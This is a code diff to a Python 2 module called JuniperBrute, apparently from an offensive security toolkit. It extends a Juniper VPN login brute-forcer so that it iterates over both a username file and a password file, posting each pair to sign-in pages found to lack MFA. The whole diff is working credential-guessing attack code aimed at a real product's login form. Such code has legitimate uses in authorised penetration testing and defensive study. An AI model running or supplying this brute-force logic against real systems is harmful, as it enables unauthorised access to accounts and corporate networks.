@@ -79,26 +79,52 @@ class JuniperBrute(webModule):
             else:
                 self.nomfaurls.append('url_default')
         if self.nomfaurls:
-            if config["UserFile"]:
-                lines = [line.rstrip('\n') for line in open(config["UserFile"])]
-                for line in lines:
-                    config["USERNAME"] = line.strip('\n')
-                    payload = {
-                    'tz_offset': '-360',
-                    'username': config["USERNAME"],
-                    'password': config["PASSWORD"],
-                    'realm': realm,
-                    'btnSubmit': 'Sign+In'
-                    }
-                    self.connectTest(config, payload, URL)
-            else:
-                payload = {
-                'tz_offset': '-360',
-                'username': config["USERNAME"],
-                'password': config["PASSWORD"],
-                'realm': realm,
-                'btnSubmit': 'Sign+In'
-                }
-                self.connectTest(config, payload, URL)
+                    if config["PASS_FILE"]:
+                        pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
+                        for pass_line in pass_lines:
+                            if config["UserFile"]:
+                                lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+                                for line in lines:
+                                    config["USERNAME"] = line.strip('\n')
+                                    config["PASSWORD"] = pass_line.strip('\n')
+                                    payload = {
+                                    'tz_offset': '-360',
+                                    'username': config["USERNAME"],
+                                    'password': config["PASSWORD"],
+                                    'realm': realm,
+                                    'btnSubmit': 'Sign+In'
+                                    }
+                                    self.connectTest(config, payload)
+                            else:
+                                config["PASSWORD"] = pass_line.strip('\n')
+                                payload = {
+                                'tz_offset': '-360',
+                                'username': config["USERNAME"],
+                                'password': config["PASSWORD"],
+                                'realm': realm,
+                                'btnSubmit': 'Sign+In'
+                                }
+                                self.connectTest(config, payload)
+                    elif config["UserFile"]:
+                        lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+                        for line in lines:
+                            config["USERNAME"] = line.strip('\n')
+                            payload = {
+                            'tz_offset': '-360',
+                            'username': config["USERNAME"],
+                            'password': config["PASSWORD"],
+                            'realm': realm,
+                            'btnSubmit': 'Sign+In'
+                            }
+                            self.connectTest(config, payload)
+                    else:
+                        payload = {
+                        'tz_offset': '-360',
+                        'username': config["USERNAME"],
+                        'password': config["PASSWORD"],
+                        'realm': realm,
+                        'btnSubmit': 'Sign+In'
+                        }
+                        self.connectTest(config, payload)
         else:
             print "[-] All pages require MFA. Aborting..."
